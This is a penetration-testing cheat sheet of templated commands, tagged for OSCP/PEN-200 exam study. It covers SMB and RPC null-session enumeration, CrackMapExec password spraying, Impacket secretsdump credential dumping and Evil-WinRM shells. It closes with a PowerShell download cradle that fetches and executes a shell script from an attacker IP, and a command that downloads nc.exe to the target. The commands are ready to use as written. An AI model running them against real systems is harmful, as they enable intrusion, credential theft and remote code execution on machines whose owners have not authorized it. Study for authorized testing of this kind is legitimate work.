
---
Description :
     List SMB shares null session (guest)

Parameters : #target-ip

```cmd
smbclient -N -L //{{target-ip}}
```

```example
smbclient -N -L //10.10.10.10
```

Tags :  #linux #smb #smbclient #oscp #pen-200

---

Description :
     Connect to SMB share with username

Parameters : #target-ip #username

```cmd
smbclient //{{target-ip}}/share -U {{username}}
```

```example
smbclient //10.10.10.10/share -U guest
```

Tags :  #linux #smb #smbclient #oscp #pen-200

---

Description :
     Recursive download from SMB share (prompt for password)

Parameters : #target-ip

```cmd
smbclient //{{target-ip}}/share -U {{username}} -c "recurse ON; prompt OFF; mget *"
```

```example
smbclient //10.10.10.10/data -U user -c "recurse ON; prompt OFF; mget *"
```

Tags :  #linux #smb #smbclient #oscp #pen-200

---

Description :
     RPC null session enumerate users

Parameters : #target-ip

```cmd
rpcclient -U "" -N {{target-ip}} -c "enumdomusers"
```

```example
rpcclient -U "" -N 10.10.10.10 -c "enumdomusers"
```

Tags :  #linux #rpc #rpcclient #oscp #pen-200

---

Description :
     CrackMapExec SMB null session check

Parameters : #target-ip

```cmd
crackmapexec smb {{target-ip}} -u '' -p ''
```

```example
crackmapexec smb 10.10.10.10 -u '' -p ''
```

Tags :  #linux #crackmapexec #smb #oscp #pen-200

---

Description :
     CrackMapExec SMB with user list and password

Parameters : #target-ip #user-file #password

```cmd
crackmapexec smb {{target-ip}} -u {{user-file}} -p '{{password}}'
```

```example
crackmapexec smb 10.10.10.10 -u users.txt -p 'Winter2024!'
```

Tags :  #linux #crackmapexec #smb #oscp #pen-200

---

Description :
     Impacket secretsdump DRSUAPI (requires creds)

Parameters : #target-ip #username #password

```cmd
impacket-secretsdump {{domain}}/{{username}}:'{{password}}'@{{target-ip}}
```

```example
impacket-secretsdump CORP/admin:'Passw0rd!'@10.10.10.10
```

Tags :  #linux #impacket #ad #oscp #pen-200

---

Description :
     Evil-WinRM PowerShell session

Parameters : #target-ip #username #password

```cmd
evil-winrm -i {{target-ip}} -u {{username}} -p '{{password}}'
```

```example
evil-winrm -i 10.10.10.10 -u administrator -p 'Welcome1!'
```

Tags :  #linux #evil-winrm #windows #oscp #pen-200

---

Description :
     LDAP search anonymous bind quick check

Parameters : #target-ip

```cmd
ldapsearch -x -H ldap://{{target-ip}} -s base namingcontexts
```

```example
ldapsearch -x -H ldap://10.10.10.10 -s base namingcontexts
```

Tags :  #linux #ldap #oscp #pen-200

---

Description :
     PowerShell download cradle (run on Windows target)

Parameters : #url

```cmd
powershell -c "IEX(New-Object Net.WebClient).DownloadString('{{url}}')"
```

```example
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/shell.ps1')"
```

Tags :  #windows #powershell #oscp #pen-200

---

Description :
     PowerShell download file to disk

Parameters : #url #file

```cmd
powershell -c "Invoke-WebRequest '{{url}}' -OutFile {{file}}"
```

```example
powershell -c "Invoke-WebRequest 'http://10.10.14.2/nc.exe' -OutFile C:\Temp\nc.exe"
```

Tags :  #windows #powershell #oscp #pen-200

---
